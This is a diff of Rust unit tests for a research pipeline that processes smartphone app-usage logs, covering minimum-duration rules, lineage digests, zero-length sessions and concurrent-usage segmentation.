+            Reason::LegacyThresholdOverflow,
+            Reason::LegacyThresholdBinary64MappingMismatch,
+            Reason::LegacyThresholdCanonicalizationMismatch,
+            Reason::RawDurationUnrepresentable,
+            Reason::EffectiveEndpointUnrepresentable,
+            Reason::DuplicateTimestampAdjustmentUnrepresentable,
+        ] {
+            assert!(!reason.is_applicability_refusal(), "{reason:?}");
+        }
+    }
+
+    #[test]
+    fn drop_row_lineage_is_a_canonical_bare_array_and_digest_mismatch_fails_closed() {
+        const SECOND: i64 = 1_000_000_000;
+        let filtered = BTreeSet::new();
+        let no_background = AHashSet::new();
+        let mut rows = episode_rows(&[
+            (
+                ACTIVITY_RESUMED,
+                "com.example.first",
+                Some(0),
+                Some(4 * SECOND),
+            ),
+            (
+                ACTIVITY_RESUMED,
+                "com.example.second",
+                Some(10 * SECOND),
+                Some(13 * SECOND),
+            ),
+        ]);
+        let mut first_sources = SourceDataRows::single(2);
+        first_sources.merge(&SourceDataRows::single(3));
+        *rows[0].edit_identity().source_data_rows = first_sources;
+        let mut second_sources = SourceDataRows::single(7);
+        second_sources.merge(&SourceDataRows::single(9));
+        *rows[1].edit_identity().source_data_rows = second_sources;
+        let classified = incremental::classify_episode_durations(
+            rows,
+            &filtered,
+            MicroUseClassificationPolicy::None,
+            5.0,
+            MinimumDurationComparator::StrictLt,
+            MinimumDurationDisposition::DropRow,
+            &[],
+            &b06::MaximumDurationRowStage::omitted(),
+        )
+        .expect("classification with the omitted B06 shape never refuses");
+        let mut options = test_options();
+        options.minimum_usage_duration = 5.0;
+        options.minimum_duration_disposition = MinimumDurationDisposition::DropRow;
+        let evidence = foundational_semantics_evidence(&classified, &options);
+        let retained = incremental::apply_app_inclusion_policy(
+            classified,
+            &filtered,
+            &AHashSet::new(),
+            &no_background,
+        );
+        assert!(retained.is_empty());
+        assert_eq!(evidence.minimum_duration.qualifying_count, 2);
+        assert_eq!(evidence.minimum_duration.dropped_count, 2);
+        assert_eq!(evidence.minimum_duration_excluded_episodes.len(), 2);
+        assert_eq!(
+            evidence.minimum_duration_excluded_episodes[0],
+            MinimumDurationExcludedEpisode {
+                participant_id: "P01".into(),
+                app_package_name: "com.example.first".into(),
+                source_data_row_ranges: vec![SourceDataRowRange { first: 2, last: 3 }],
+                raw_start_timestamp_ns: 0,
+                raw_stop_timestamp_ns: 4 * SECOND,
+                raw_duration_ns: 4 * SECOND,
+                reason: "below_minimum_duration_drop_row".into(),
+                disposition: MinimumDurationDisposition::DropRow,
+            },
+        );
+        assert_eq!(
+            evidence.minimum_duration_excluded_episodes[1].source_data_row_ranges,
+            vec![
+                SourceDataRowRange { first: 7, last: 7 },
+                SourceDataRowRange { first: 9, last: 9 },
+            ],
+        );
+        assert_eq!(
+            evidence.minimum_duration_excluded_episodes[1].raw_start_timestamp_ns,
+            10 * SECOND,
+        );
+        assert_eq!(
+            evidence.minimum_duration_excluded_episodes[1].raw_stop_timestamp_ns,
+            13 * SECOND,
+        );
+        assert_eq!(
+            evidence.minimum_duration_excluded_episodes[1].raw_duration_ns,
+            3 * SECOND,
+        );
+        let bytes = minimum_duration_excluded_lineage_bytes(&evidence).unwrap();
+        assert_eq!(
+            bytes,
+            serde_json::to_vec(&evidence.minimum_duration_excluded_episodes).unwrap(),
+            "the artifact envelope must be the bare sorted episode array",
+        );
+        assert!(serde_json::from_slice::<serde_json::Value>(&bytes)
+            .unwrap()
+            .is_array());
+        assert_eq!(
+            evidence.minimum_duration.excluded_lineage_digest,
+            format!("sha256:{}", hex::encode(Sha256::digest(&bytes))),
+        );
+        validate_minimum_duration_excluded_lineage(&evidence).unwrap();
+
+        let mut mutated_entry = evidence.clone();
+        mutated_entry.minimum_duration_excluded_episodes[0].raw_duration_ns += 1;
+        assert_eq!(
+            validate_minimum_duration_excluded_lineage(&mutated_entry),
+            Err("minimum_duration_excluded_lineage_digest_mismatch".into()),
+        );
+        let mut mutated_digest = evidence;
+        mutated_digest.minimum_duration.excluded_lineage_digest =
+            format!("sha256:{}", "0".repeat(64));
+        assert_eq!(
+            validate_minimum_duration_excluded_lineage(&mutated_digest),
+            Err("minimum_duration_excluded_lineage_digest_mismatch".into()),
+        );
+
+        let mut reordered = foundational_semantics_evidence(
+            &incremental::classify_episode_durations(
+                episode_rows(&[
+                    (
+                        ACTIVITY_RESUMED,
+                        "com.example.first",
+                        Some(0),
+                        Some(4 * SECOND),
+                    ),
+                    (
+                        ACTIVITY_RESUMED,
+                        "com.example.second",
+                        Some(10 * SECOND),
+                        Some(13 * SECOND),
+                    ),
+                ]),
+                &filtered,
+                MicroUseClassificationPolicy::None,
+                5.0,
+                MinimumDurationComparator::StrictLt,
+                MinimumDurationDisposition::DropRow,
+                &[],
+                &b06::MaximumDurationRowStage::omitted(),
+            )
+            .expect("classification with the omitted B06 shape never refuses"),
+            &options,
+        );
+        reordered.minimum_duration_excluded_episodes.reverse();
+        reordered.minimum_duration.excluded_lineage_digest = format!(
+            "sha256:{}",
+            hex::encode(Sha256::digest(
+                serde_json::to_vec(&reordered.minimum_duration_excluded_episodes).unwrap(),
+            )),
+        );
+        assert_eq!(
+            validate_minimum_duration_excluded_lineage(&reordered),
+            Err("minimum_duration_excluded_lineage_noncanonical_order".into()),
+            "the standalone artifact validator accepted reordered, coherently rehashed lineage",
+        );
+    }
+
+    #[test]
+    fn zero_threshold_disables_b04_without_stealing_the_zero_row_filter_decision() {
+        let filtered = BTreeSet::new();
+        let classified = incremental::classify_episode_durations(
+            episode_rows(&[(ACTIVITY_RESUMED, "com.example.zero", Some(0), Some(0))]),
+            &filtered,
+            MicroUseClassificationPolicy::OkoshiLt5s,
+            0.0,
+            MinimumDurationComparator::InclusiveLe,
+            MinimumDurationDisposition::DropRow,
+            &[],
+            &b06::MaximumDurationRowStage::omitted(),
+        )
+        .expect("classification with the omitted B06 shape never refuses");
+        assert_eq!(classified.len(), 1);
+        assert_eq!(classified[0].minimum_duration_qualified, Some(false));
+        assert!(!classified[0].minimum_duration_drop_pending);
+        assert_eq!(classified[0].raw_episode_duration_ns, Some(0));
+        assert_eq!(
+            classified[0].micro_use_classification,
+            Some(MicroUseClassification::NotClassifiable),
+        );
+        assert_eq!(
+            incremental::remove_zero_duration_rows(classified.clone(), false).len(),
+            1,
+        );
+        assert!(incremental::remove_zero_duration_rows(classified, true).is_empty());
+    }
+
+    #[test]
+    fn zero_cleanup_source_lineage_reaches_its_receipt_workflow_and_manifest_identity() {
+        let filtered = BTreeSet::new();
+        let classified = incremental::classify_episode_durations(
+            episode_rows(&[(ACTIVITY_RESUMED, "com.example.zero", Some(0), Some(0))]),
+            &filtered,
+            MicroUseClassificationPolicy::None,
+            0.0,
+            MinimumDurationComparator::StrictLt,
+            MinimumDurationDisposition::RetainAndCredit,
+            &[],
+            &b06::MaximumDurationRowStage::omitted(),
+        )
+        .expect("classification with the omitted B06 shape never refuses");
+        let mut first = classified.clone();
+        *first[0].edit_identity().source_data_rows = SourceDataRows::single(2);
+        let mut second = classified;
+        *second[0].edit_identity().source_data_rows = SourceDataRows::single(9);
+
+        let first_cleanup = zero_duration_cleanup_evidence(&first, true, true);
+        let second_cleanup = zero_duration_cleanup_evidence(&second, true, true);
+        assert_eq!(first_cleanup.receipt.removed_row_count, 1);
+        assert_eq!(second_cleanup.receipt.removed_row_count, 1);
+        assert_eq!(
+            first_cleanup.removed_rows[0].source_data_row_ranges,
+            vec![SourceDataRowRange { first: 2, last: 2 }],
+        );
+        assert_eq!(
+            second_cleanup.removed_rows[0].source_data_row_ranges,
+            vec![SourceDataRowRange { first: 9, last: 9 }],
+        );
+        assert_ne!(
+            first_cleanup.receipt.removed_lineage_digest,
+            second_cleanup.receipt.removed_lineage_digest,
+            "source association is part of the canonical removed identity",
+        );
+
+        // Both executions have the same empty post-cleanup row table.  Their
+        // remove-zero checkpoints must still differ because the typed receipt
+        // carries the source identity that was removed.
+        let removed = Vec::<Row>::new();
+        let first_cleanup_fingerprint = value_fingerprint(&first_cleanup).unwrap();
+        let second_cleanup_fingerprint = value_fingerprint(&second_cleanup).unwrap();
+        let first_cleanup_checkpoint = workflow_checkpoint(
+            "remove_zero_duration_rows",
+            &[("rows", &removed)],
+            &[("value", &first_cleanup_fingerprint)],
+        );
+        let second_cleanup_checkpoint = workflow_checkpoint(
+            "remove_zero_duration_rows",
+            &[("rows", &removed)],
+            &[("value", &second_cleanup_fingerprint)],
+        );
+        assert_ne!(
+            first_cleanup_checkpoint.terminal_digest,
+            second_cleanup_checkpoint.terminal_digest,
+        );
+
+        let mut options = test_options();
+        options.minimum_usage_duration = 0.0;
+        options.minimum_duration_disposition = MinimumDurationDisposition::RetainAndCredit;
+        let mut first_foundational = foundational_semantics_evidence(&first, &options);
+        first_foundational.zero_duration_cleanup = first_cleanup;
+        let mut second_foundational = foundational_semantics_evidence(&second, &options);
+        second_foundational.zero_duration_cleanup = second_cleanup;
+        let first_foundational_fingerprint = value_fingerprint(&first_foundational).unwrap();
+        let second_foundational_fingerprint = value_fingerprint(&second_foundational).unwrap();
+        let assembled = workflow_checkpoint(
+            "assemble_result_manifest",
+            &[],
+            &[("app_csv", b"same-scientific-product")],
+        );
+        let manifest = |fingerprint: &[u8]| {
+            checkpoint_for_exact_row_state(
+                "assemble_result_manifest",
+                &assembled,
+                &[
+                    (
+                        "assembledOutputsCheckpoint",
+                        assembled.terminal_digest.as_bytes(),
+                    ),
+                    ("openerSetEvidence", b"same"),
+                    ("foundationalSemanticsEvidence", fingerprint),
+                    ("eyesTaggedFauEvidence", b"same"),
+                    ("b05SchoedelEvidence", b"same"),
+                ],
+            )
+        };
+        assert_ne!(
+            manifest(&first_foundational_fingerprint).terminal_digest,
+            manifest(&second_foundational_fingerprint).terminal_digest,
+            "manifest identity failed to retain removed source lineage",
+        );
+
+        assert!(
+            crate::workflow_contract::query_field_reads("remove_zero_duration_rows")
+                .contains(&"row.membership")
+        );
+        assert_eq!(
+            crate::workflow_contract::query_group_applicability("interval_cleaning"),
+            crate::workflow_contract::ApplicabilityExpression::OptionTrue {
+                option_key: "process_app_usage",
+            },
+            "the descriptive zero-candidate census runs for every app pipeline",
+        );
+    }
+
+    #[test]
+    #[cfg(feature = "incremental-v2")]
+    fn sub_half_nanosecond_threshold_normalizes_to_the_disabled_zero_binding() {
+        let rows = episode_rows(&[(ACTIVITY_RESUMED, "com.example.zero", Some(0), Some(0))]);
+        let filtered = BTreeSet::new();
+        let run = |minimum| {
+            incremental::classify_episode_durations(
+                rows.clone(),
+                &filtered,
+                MicroUseClassificationPolicy::None,
+                minimum,
+                MinimumDurationComparator::InclusiveLe,
+                MinimumDurationDisposition::RetainButExclude,
+                &[],
+                &b06::MaximumDurationRowStage::omitted(),
+            )
+            .expect("classification with the omitted B06 shape never refuses")
+        };
+        let zero = run(0.0);
+        let sub_ns = run(0.4e-9);
+        assert_eq!(minimum_duration_threshold_ns(0.0), None);
+        assert_eq!(minimum_duration_threshold_ns(0.4e-9), None);
+        assert_eq!(zero[0].minimum_duration_qualified, Some(false));
+        assert_eq!(sub_ns[0].minimum_duration_qualified, Some(false));
+        assert!(zero[0].minimum_duration_aggregate_eligible);
+        assert!(sub_ns[0].minimum_duration_aggregate_eligible);
+        assert_eq!(
+            workflow_rows_checkpoint("zero", &zero),
+            workflow_rows_checkpoint("zero", &sub_ns),
+        );
+
+        let raw = concat!(
+            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
+            "Study,P01,Child,Zero,Activity Resumed,com.example.zero,2026-03-07 10:00:00,UTC\n",
+            "Study,P01,Child,Zero,Activity Paused,com.example.zero,2026-03-07 10:00:00,UTC\n",
+        );
+        let mut options = test_options();
+        options.timezone = "UTC".into();
+        options.correct_duplicate_event_timestamps = false;
+        options.minimum_usage_duration = 0.4e-9;
+        options.minimum_usage_duration_explicit = true;
+        options.minimum_duration_comparator = MinimumDurationComparator::InclusiveLe;
+        options.minimum_duration_comparator_explicit = true;
+        options.minimum_duration_disposition = MinimumDurationDisposition::RetainButExclude;
+        options.minimum_duration_disposition_explicit = true;
+        options.filter_zero_duration_sessions = false;
+        let sequential = run_pipeline_v2_with_supports(
+            raw.as_bytes(),
+            &options,
+            PipelineV2SupportFiles::default(),
+        )
+        .unwrap();
+        let mut engine = crate::pipeline_v2::IncrementalPipelineV2Engine::default();
+        let tracked = engine
+            .execute(raw.as_bytes(), &options, PipelineV2SupportFiles::default())
+            .unwrap();
+        assert_eq!(tracked.result.app_csv_bytes, sequential.app_csv_bytes);
+        assert_eq!(
+            tracked.result.foundational_semantics_evidence,
+            sequential.foundational_semantics_evidence,
+        );
+        assert_eq!(
+            sequential
+                .foundational_semantics_evidence
+                .minimum_duration
+                .threshold_ns,
+            0,
+        );
+        assert_eq!(
+            sequential
+                .foundational_semantics_evidence
+                .minimum_duration
+                .qualifying_count,
+            0,
+        );
+    }
+
+    #[test]
+    fn b03_and_b04_form_an_orthogonal_two_by_two_on_the_same_raw_durations() {
+        const SECOND: i64 = 1_000_000_000;
+        let rows = episode_rows(&[
+            (
+                ACTIVITY_RESUMED,
+                "com.example.four",
+                Some(0),
+                Some(4 * SECOND),
+            ),
+            (
+                ACTIVITY_RESUMED,
+                "com.example.six",
+                Some(10 * SECOND),
+                Some(16 * SECOND),
+            ),
+        ]);
+        let filtered = BTreeSet::new();
+        let mut baseline_qualification = None;
+        for micro in [
+            MicroUseClassificationPolicy::None,
+            MicroUseClassificationPolicy::OkoshiLt5s,
+        ] {
+            for disposition in [
+                MinimumDurationDisposition::RetainAndCredit,
+                MinimumDurationDisposition::RetainButExclude,
+            ] {
+                let classified = incremental::classify_episode_durations(
+                    rows.clone(),
+                    &filtered,
+                    micro,
+                    5.0,
+                    MinimumDurationComparator::StrictLt,
+                    disposition,
+                    &[],
+                    &b06::MaximumDurationRowStage::omitted(),
+                )
+                .expect("classification with the omitted B06 shape never refuses");
+                let qualifications = classified
+                    .iter()
+                    .map(|row| row.minimum_duration_qualified)
+                    .collect::<Vec<_>>();
+                assert_eq!(qualifications, vec![Some(true), Some(false)]);
+                if let Some(expected) = &baseline_qualification {
+                    assert_eq!(&qualifications, expected);
+                } else {
+                    baseline_qualification = Some(qualifications);
+                }
+                assert_eq!(
+                    classified
+                        .iter()
+                        .map(|row| row.micro_use_classification)
+                        .collect::<Vec<_>>(),
+                    match micro {
+                        MicroUseClassificationPolicy::None => vec![None, None],
+                        MicroUseClassificationPolicy::OkoshiLt5s => vec![
+                            Some(MicroUseClassification::MicroUse),
+                            Some(MicroUseClassification::NotMicroUse),
+                        ],
+                    },
+                );
+                assert_eq!(
+                    classified
+                        .iter()
+                        .map(|row| row.minimum_duration_aggregate_eligible)
+                        .collect::<Vec<_>>(),
+                    match disposition {
+                        MinimumDurationDisposition::RetainAndCredit => vec![true, true],
+                        MinimumDurationDisposition::RetainButExclude => vec![false, true],
+                        _ => unreachable!(),
+                    },
+                );
+                assert_eq!(
+                    classified
+                        .iter()
+                        .map(|row| row.duration_seconds.map(f64::to_bits))
+                        .collect::<Vec<_>>(),
+                    vec![Some(4.0_f64.to_bits()), Some(6.0_f64.to_bits())],
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn minimum_duration_is_decided_once_before_concurrency_without_a_second_floor() {
+        const SECOND: i64 = 1_000_000_000;
+        let filtered = BTreeSet::new();
+        let no_background = AHashSet::new();
+        let classified = incremental::classify_episode_durations(
+            episode_rows(&[
+                (
+                    ACTIVITY_RESUMED,
+                    "com.example.outer",
+                    Some(0),
+                    Some(12 * SECOND),
+                ),
+                (
+                    ACTIVITY_RESUMED,
+                    "com.example.inner",
+                    Some(4 * SECOND),
+                    Some(12 * SECOND),
+                ),
+            ]),
+            &filtered,
+            MicroUseClassificationPolicy::None,
+            5.0,
+            MinimumDurationComparator::StrictLt,
+            MinimumDurationDisposition::ChronicleBlankKeepRow,
+            &[],
+            &b06::MaximumDurationRowStage::omitted(),
+        )
+        .expect("classification with the omitted B06 shape never refuses");
+        let mut options = test_options();
+        options.minimum_usage_duration = 5.0;
+        let evidence = foundational_semantics_evidence(&classified, &options);
+        assert_eq!(evidence.minimum_duration.bounded_episode_count, 2);
+        assert_eq!(evidence.minimum_duration.qualifying_count, 0);
+        assert_eq!(evidence.minimum_duration.retained_credited_count, 2);
+
+        let split = incremental::segment_concurrent_usage(
+            classified,
+            &filtered,
+            &no_background,
+            true,
+            5.0,
+            false,
+        )
+        .expect("concurrency split");
+        assert_eq!(
+            split
+                .iter()
+                .filter(|row| row.app_package_name == "com.example.outer")
+                .map(|row| row.duration_seconds.map(f64::to_bits))
+                .collect::<Vec<_>>(),
+            vec![Some(4.0_f64.to_bits()), Some(8.0_f64.to_bits())],
+            "a subinterval below the five-second episode floor remains credited when the explicit subinterval floor is off",
+        );
+        assert!(split.iter().all(|row| {
+            row.minimum_duration_qualified == Some(false) && row.minimum_duration_aggregate_eligible
+        }));
+    }
+
+    #[test]
+    fn concurrency_preserves_b04_state_and_receipts_the_separate_postfloor_causally() {
+        const SECOND: i64 = 1_000_000_000;
+        let filtered = BTreeSet::new();
+        let no_background = AHashSet::new();
+        for disposition in [
+            MinimumDurationDisposition::ChronicleBlankKeepRow,
+            MinimumDurationDisposition::RetainButExclude,
+        ] {
+            let classified = incremental::classify_episode_durations(
+                episode_rows(&[
+                    (
+                        ACTIVITY_RESUMED,
+                        "com.example.outer",
+                        Some(0),
+                        Some(12 * SECOND),
+                    ),
+                    (
+                        ACTIVITY_RESUMED,
+                        "com.example.inner",
+                        Some(4 * SECOND),
+                        Some(12 * SECOND),
+                    ),
+                ]),
+                &filtered,
+                MicroUseClassificationPolicy::OkoshiLt5s,
+                10.0,
+                MinimumDurationComparator::StrictLt,
+                disposition,
+                &[],
+                &b06::MaximumDurationRowStage::omitted(),
+            )
+            .expect("classification with the omitted B06 shape never refuses");
+            let mut options = test_options();
+            options.micro_use_classification_policy = MicroUseClassificationPolicy::OkoshiLt5s;
+            options.minimum_usage_duration = 10.0;
+            options.minimum_duration_disposition = disposition;
+            let foundational = foundational_semantics_evidence(&classified, &options);
+            assert_eq!(foundational.minimum_duration.qualifying_count, 1);
+
+            for postfloor in [false, true] {
+                let segmented = incremental::segment_concurrent_usage(
+                    classified.clone(),
+                    &filtered,
+                    &no_background,
+                    true,
+                    10.0,
+                    postfloor,
+                )
+                .expect("participant-local concurrency segmentation");
+                assert_eq!(segmented.len(), 3);
+                let outer = segmented
+                    .iter()
+                    .filter(|row| row.app_package_name == "com.example.outer")
+                    .collect::<Vec<_>>();
+                assert_eq!(outer.len(), 2);
+                assert!(outer.iter().all(|row| {
+                    row.raw_episode_start_timestamp_ns == Some(0)
+                        && row.raw_episode_stop_timestamp_ns == Some(12 * SECOND)
+                        && row.raw_episode_duration_ns == Some(12 * SECOND)
+                        && row.minimum_duration_qualified == Some(false)
+                        && row.minimum_duration_aggregate_eligible
+                }));
+                let inner = segmented
+                    .iter()
+                    .find(|row| row.app_package_name == "com.example.inner")
+                    .unwrap();
+                assert_eq!(inner.raw_episode_start_timestamp_ns, Some(4 * SECOND));
+                assert_eq!(inner.raw_episode_stop_timestamp_ns, Some(12 * SECOND));
+                assert_eq!(inner.raw_episode_duration_ns, Some(8 * SECOND));
+                assert_eq!(inner.minimum_duration_qualified, Some(true));
+                assert_eq!(
+                    inner.minimum_duration_aggregate_eligible,
+                    disposition == MinimumDurationDisposition::ChronicleBlankKeepRow,
+                );
+                assert_eq!(
+                    inner.minimum_duration_blank_applied,
+                    disposition == MinimumDurationDisposition::ChronicleBlankKeepRow,
+                );
+
+                let expected_postfloor_count = match (postfloor, disposition) {
+                    (false, _) => 0,
+                    (true, MinimumDurationDisposition::ChronicleBlankKeepRow) => 2,
+                    (true, MinimumDurationDisposition::RetainButExclude) => 3,
+                    _ => unreachable!(),
+                };
+                assert_eq!(
+                    segmented
+                        .iter()
+                        .filter(|row| row.concurrent_subinterval_floor_blank_applied)
+                        .count(),
+                    expected_postfloor_count,
+                    "the postfloor marker is causal and cannot double-claim a B04 blank",
+                );
+                let mut evidence = foundational.clone();
+                attach_concurrent_subinterval_floor_evidence(
+                    &mut evidence,
+                    &segmented,
+                    10.0,
+                    postfloor,
+                    true,
+                );
+                assert_eq!(evidence.minimum_duration.qualifying_count, 1);
+                assert_eq!(
+                    evidence.concurrent_subinterval_floor.requested_applied,
+                    postfloor
+                );
+                assert_eq!(
+                    evidence.concurrent_subinterval_floor.threshold_ns,
+                    10 * SECOND
+                );
+                assert_eq!(
+                    evidence
+                        .concurrent_subinterval_floor
+                        .generated_subinterval_count,
+                    3
+                );
+                assert_eq!(
+                    evidence
+                        .concurrent_subinterval_floor
+                        .blanked_subinterval_count,
+                    expected_postfloor_count as u32,
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn concurrent_segmentation_is_participant_partitioned_and_exact_at_large_ns_floor() {
+        const SECOND: i64 = 1_000_000_000;
+        let filtered = BTreeSet::new();
+        let no_background = AHashSet::new();
+        let mut combined = episode_rows(&[
+            (APP_USAGE, "p1.outer", Some(0), Some(12 * SECOND)),
+            (APP_USAGE, "p2.outer", Some(0), Some(12 * SECOND)),
+            (APP_USAGE, "p1.inner", Some(4 * SECOND), Some(12 * SECOND)),
+            (APP_USAGE, "p2.inner", Some(4 * SECOND), Some(12 * SECOND)),
+        ]);
+        for (row, participant) in combined.iter_mut().zip(["P01", "P02", "P01", "P02"]) {
+            *row.edit_classification().participant_id = participant.into();
+        }
+        let observed = incremental::segment_concurrent_usage(
+            combined.clone(),
+            &filtered,
+            &no_background,
+            true,
+            0.0,
+            false,
+        )
+        .unwrap();
+        let mut isolated = Vec::new();
+        for participant in ["P01", "P02"] {
+            isolated.extend(
+                incremental::segment_concurrent_usage(
+                    combined
+                        .iter()
+                        .filter(|row| row.participant_id == participant)
+                        .cloned()
+                        .collect(),
+                    &filtered,
+                    &no_background,
+                    true,
+                    0.0,
+                    false,
+                )
+                .unwrap(),
+            );
+        }
+        let signature = |rows: &[Row]| {
+            let mut values = rows
+                .iter()
+                .map(|row| {
+                    (
+                        row.participant_id.to_string(),
+                        row.app_package_name.to_string(),
+                        row.start_timestamp_ns,
+                        row.stop_timestamp_ns,
+                        row.usage_layer.as_deref().map(str::to_owned),
+                        row.duration_seconds.map(f64::to_bits),
+                    )
+                })
+                .collect::<Vec<_>>();
+            values.sort();
+            values
+        };
+        assert_eq!(signature(&observed), signature(&isolated));
+
+        let threshold_seconds = 10_000_000.0;
+        let threshold_ns = 10_000_000_i64 * SECOND;
+        let large = episode_rows(&[(
+            APP_USAGE,
+            "com.example.large",
+            Some(0),
+            Some(threshold_ns - 1),
+        )]);
+        let floored = incremental::segment_concurrent_usage(
+            large,
+            &filtered,
+            &no_background,
+            true,
+            threshold_seconds,
+            true,
+        )
+        .unwrap();
+        assert_eq!(floored.len(), 1);
+        assert_eq!(floored[0].duration_seconds, None);
+        assert!(floored[0].concurrent_subinterval_floor_blank_applied);
+    }
+
+    #[test]
+    fn retain_but_exclude_keeps_the_public_row_out_of_headline_outputs_end_to_end() {
+        let csv = concat!(
+            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
+            "Study,P01,Target Child,Chat,Activity Resumed,com.example.chat,2026-03-07 10:00:00,America/Chicago\n",
+            "Study,P01,Target Child,Chat,Activity Paused,com.example.chat,2026-03-07 10:00:30,America/Chicago\n",
+        );
+        let mut credited_options = test_options();
+        credited_options.minimum_usage_duration = 60.0;
+        credited_options.minimum_duration_disposition = MinimumDurationDisposition::RetainAndCredit;
+        credited_options.enable_aggregates = true;
+        credited_options.materialize_visualization_data = false;
+        let mut excluded_options = credited_options.clone();
+        excluded_options.minimum_duration_disposition =
+            MinimumDurationDisposition::RetainButExclude;
+
+        let credited = run_pipeline_v2_with_supports(
+            csv.as_bytes(),
+            &credited_options,
+            PipelineV2SupportFiles::default(),
+        )
+        .expect("credited binding runs");
+        let excluded = run_pipeline_v2_with_supports(
+            csv.as_bytes(),
+            &excluded_options,
+            PipelineV2SupportFiles::default(),
+        )
+        .expect("excluded binding runs");
+
+        assert_eq!(credited.app_row_count, 1);
+        assert_eq!(excluded.app_row_count, 1, "the public row is retained");
+        let credited_lines = csv_lines(&credited.app_csv_bytes.to_vec());
+        let excluded_lines = csv_lines(&excluded.app_csv_bytes.to_vec());
+        let eligibility_column = excluded_lines[0]
+            .iter()
+            .position(|column| column == "minimum_duration_aggregate_eligible")
+            .expect("eligibility column");
+        assert_eq!(credited_lines[1][eligibility_column], "true");
+        assert_eq!(excluded_lines[1][eligibility_column], "false");
+        assert_ne!(
+            credited.review_summary_json_bytes, excluded.review_summary_json_bytes,
+            "headline participant summaries must exclude the ineligible episode",
+        );
+        assert!(
+            credited
+                .aggregate_csv_outputs
+                .iter()
+                .map(|output| output.row_count)
+                .sum::<u32>()
+                > excluded
+                    .aggregate_csv_outputs
+                    .iter()
+                    .map(|output| output.row_count)
+                    .sum::<u32>(),
+            "headline aggregates must exclude the ineligible episode",
+        );
+        assert_eq!(
+            excluded
+                .foundational_semantics_evidence
+                .minimum_duration
+                .retained_excluded_count,
+            1,
+        );
+        assert_eq!(
+            excluded
+                .foundational_semantics_evidence
+                .minimum_duration_excluded_episodes
+                .len(),
+            1,
+            "the retained row still has explicit exclusion lineage",
+        );
+    }
+
+    /// Whether a zero-length app-usage session survives is decided by
+    /// `remove_zero_duration_rows`, under the researcher's
+    /// `filter_zero_duration_sessions` option — not by concurrency modelling,
+    /// which answers a different question.
+    ///
+    /// Nothing about that is automatic. `segment_concurrent_usage` rebuilds
+    /// the app-usage rows purely from what the sweep-line emits, and the
+    /// sweep-line never *opens* a session whose stop is not strictly after its
+    /// start, so a start == stop row would otherwise be gone before the step
+    /// meant to judge it ever saw it — and only when concurrency modelling
+    /// happened to be running. One explicit block at the end of
+    /// `split_overlapping_sessions` emits a primary row for those sessions and
+    /// is the single reason this holds; this pins it from the caller's side.
+    ///
+    /// Chronicle logs really do carry these: duplicate event timestamps are
+    /// common enough that the pipeline has a whole correction step for them,
+    /// and a resume and its stop landing on the same millisecond is what a
+    /// zero-length session is.
+    #[test]
+    fn a_zero_length_session_survives_concurrency_modelling_for_the_zero_duration_step_to_judge() {
+        const SECOND: i64 = 1_000_000_000;
+        let filtered = BTreeSet::new();
+        let no_background = AHashSet::new();
+
+        let rows = episode_rows(&[
+            (APP_USAGE, "com.example.chat", Some(0), Some(0)),
+            (
+                APP_USAGE,
+                "com.example.music",
+                Some(50 * SECOND),
+                Some(150 * SECOND),
+            ),
+        ]);
+
+        let packages = |rows: Vec<Row>| -> Vec<String> {
+            rows.iter()
+                .map(|row| row.app_package_name.to_string())
+                .collect()
+        };
+
+        let without_modelling = packages(
+            incremental::segment_concurrent_usage(
+                rows.clone(),
+                &filtered,
+                &no_background,
+                false,
+                0.0,
+                false,
+            )
+            .expect("no split requested"),
+        );
+        let with_modelling = packages(
+            incremental::segment_concurrent_usage(
+                rows.clone(),
+                &filtered,
+                &no_background,
+                true,
+                0.0,
+                false,
+            )
+            .expect("split by option"),
+        );
+
+        assert!(
+            without_modelling.contains(&"com.example.chat".to_string()),
+            "the zero-length session must reach the zero-duration step"
+        );
+        assert_eq!(
+            with_modelling, without_modelling,
+            "concurrency modelling must not decide whether a zero-length \
+             session exists"
         );
     }
 
@@ -13013,8 +13883,31 @@ mod tests {
             ),
             vec![(20, 40)]
         );
-        // A trailing blip shorter than the auto-lock keeps the interval open to
-        // the end of the session rather than truncating at the blip.
+        // A trailing OFF is a blip only if the screen comes back within the
+        // auto-lock, even when that return falls after the session ends: then
+        // the interval stays open to the end of the session.
+        assert_eq!(
+            creditable_intervals(
+                &[credit_point(0, On), credit_point(95, Off), credit_point(102, On)],
+                0,
+                100,
+                bridge
+            ),
+            vec![(0, 100)]
+        );
+        // An OFF the session end merely clips is measured to the screen's real
+        // return: here it lasts 30, a real lock, so credit stops at the OFF.
+        assert_eq!(
+            creditable_intervals(
+                &[credit_point(0, On), credit_point(95, Off), credit_point(125, On)],
+                0,
+                100,
+                bridge
+            ),
+            vec![(0, 95)]
+        );
+        // An OFF the recording never ends is a lock, however close to the
+        // session end it starts.
         assert_eq!(
             creditable_intervals(
                 &[credit_point(0, On), credit_point(95, Off)],
@@ -13022,7 +13915,7 @@ mod tests {
                 100,
                 bridge
             ),
-            vec![(0, 100)]
+            vec![(0, 95)]
         );
         // A zero-length window credits nothing whatever the screen was doing.
         assert_eq!(
@@ -13143,7 +14036,7 @@ mod tests {
             &raw,
             "America/Chicago",
             &BTreeMap::new(),
-            "test-device",
+            &BTreeMap::from([("P01".to_owned(), "test-device".to_owned())]),
         )
         .expect("canonical rows")
         .remove(0);
@@ -13274,6 +14167,7 @@ mod tests {
                     auto_lock_tolerance_seconds: 30.0,
                     manual_lock_max_tail_seconds: 30.0,
                     keyguard_near_stop_seconds,
+                    locked_screen_audio_disposition: LockedScreenAudioDisposition::Include,
                 },
             )
             .iter()
@@ -13301,7 +14195,7 @@ mod tests {
                 ("2026-03-07 10:03:21", "Screen Non-Interactive", ""),
             ]);
             let stop = rows[3].event_timestamp_ns;
-            rows[2].edit_temporal().event_timestamp_ns = stop - offset_ns;
+            *rows[2].edit_temporal().event_timestamp_ns = stop - offset_ns;
             reasons(&rows, near_stop_seconds)
         };
 
@@ -13382,6 +14276,7 @@ mod tests {
             error: None,
             last_row_parts: None,
             last_row_checkpoint: None,
+            last_canonical_order: None,
         }
     }
 
@@ -13630,9 +14525,29 @@ mod output_contract {
     fn contract_options() -> PipelineV2Options {
         PipelineV2Options {
             study_name: "Kernel Output Contract".into(),
+            // On, matching the published default: the golden has to be the
+            // table a researcher actually receives, not a narrower one.
+            include_app_usage_end_reason: true,
+            neutralize_spreadsheet_formulas: false,
